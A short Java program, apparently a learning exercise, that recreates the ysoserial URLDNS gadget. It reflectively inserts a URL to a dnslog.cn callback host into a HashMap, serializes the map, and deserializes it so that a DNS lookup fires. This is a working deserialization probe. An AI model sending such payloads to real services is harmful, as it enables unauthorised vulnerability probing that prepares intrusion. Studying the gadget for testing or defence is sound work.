package com.sec.cwm.base.ysoserial;

import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {

        HashMap<URL, Integer> hashMap = new HashMap<>();
        URL url     = new URL("http://oqnm1l.dnslog.cn");

        Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
        for (Method method : m) {
            if (method.getName().equals("putVal")) {
                method.setAccessible(true);
                method.invoke(hashMap, -1, url, 0, false, true);
            }
        }
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        ois.readObject();
    }
}
